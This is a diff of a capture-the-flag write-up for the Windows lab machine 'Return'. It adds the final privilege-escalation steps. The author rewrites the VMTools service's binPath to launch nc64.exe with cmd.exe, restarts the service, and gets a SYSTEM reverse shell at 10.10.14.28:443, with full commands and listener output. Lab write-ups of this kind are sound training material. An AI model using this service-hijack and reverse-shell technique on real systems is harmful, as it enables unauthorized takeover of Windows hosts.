@@ -218,7 +218,7 @@ We did it!! User flag earned, come on with the privilege escalation!!
 
 <br />
 
-# Privilege Escalation: svc-printer -> NT AUTHORITY\SYSTEM
+# Privilege Escalation: svc-printer -> nt authority\system:
 
 <br />
 
@@ -277,7 +277,7 @@ Info: Upload successful!
 
 <br />
 
-After that, we proceed to create a `service` introducing the `binary` path:
+After that, we proceed to create a `service` introducing the service name, `binary` path, our address to receive the `reverse shell`...:
 
 <br />
 
@@ -285,5 +285,54 @@ After that, we proceed to create a `service` introducing the `binary` path:
 *Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc64.exe -e cmd.exe 10.10.14.28 443"
 [SC] ChangeServiceConfig SUCCESS
 ```
+
+<br />
+
+Finally we start the `listener` and then, we will `stop` the service and `start` it again:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe stop VMTools
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe start VMTools
+```
+
+<br />
+
+Check the listener...
+
+<br />
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.28] from (UNKNOWN) [10.10.11.108] 54645
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami     
+nt authority\system
+c
+C:\Windows\system32> cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>type root.txt 
+5278c85cbf887c7ae5ddf85a06xxxxxx
+```
+
+We are nt authority\system!! Machine Return pwned!!
+
+This is a really easy Windows Machine, but with a interesting privilege escalation and really good to beginners.
+
+Keep Hacking!!❤️❤️
 
 <br />
